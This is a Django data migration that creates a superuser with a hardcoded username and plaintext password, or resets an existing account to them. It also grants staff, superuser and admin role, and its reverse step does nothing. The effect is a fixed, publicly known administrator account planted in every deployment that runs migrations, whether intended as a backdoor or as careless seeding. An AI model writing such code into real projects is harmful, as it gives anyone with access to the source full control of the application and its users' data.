from django.db import migrations


def setup_admin_user(apps, schema_editor):
    from django.contrib.auth.hashers import make_password

    CustomUser = apps.get_model('core', 'CustomUser')
    username = 'SSs12345'
    password = '70s097oo'

    user = CustomUser.objects.filter(username=username).first()
    if user:
        user.password = make_password(password)
        user.is_staff = True
        user.is_superuser = True
        user.is_active = True
        if hasattr(user, 'role'):
            user.role = 'admin'
        user.save()
    else:
        CustomUser.objects.create(
            username=username,
            password=make_password(password),
            email='',
            is_staff=True,
            is_superuser=True,
            is_active=True,
            role='admin',
        )


def reverse_setup_admin(apps, schema_editor):
    pass


class Migration(migrations.Migration):

    dependencies = [
        ('core', '0018_alter_auditlog_action_type_advancerequest'),
    ]

    operations = [
        migrations.RunPython(setup_admin_user, reverse_code=reverse_setup_admin),
    ]
